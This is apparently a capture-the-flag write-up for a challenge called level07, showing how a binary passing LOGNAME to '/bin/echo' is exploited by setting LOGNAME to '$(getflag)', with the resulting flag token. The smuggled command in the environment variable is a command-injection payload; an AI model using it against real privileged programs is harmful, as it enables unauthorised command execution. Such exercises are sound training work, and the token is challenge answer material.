First, I checked the executable with ``strings`` and ``nm -u`` which gave me :
```
LOGNAME
/bin/echo %s 
```

I just checked if ``LOGNAME`` was a environement variable and I changed the value of ``LOGNAME`` with:

```bash
export LOGNAME=\$\(getflag\)
``` 

After that, we launch ``./level07`` :

``Check flag.Here is your token : fiumuikeil55xe9cu4dood66h``
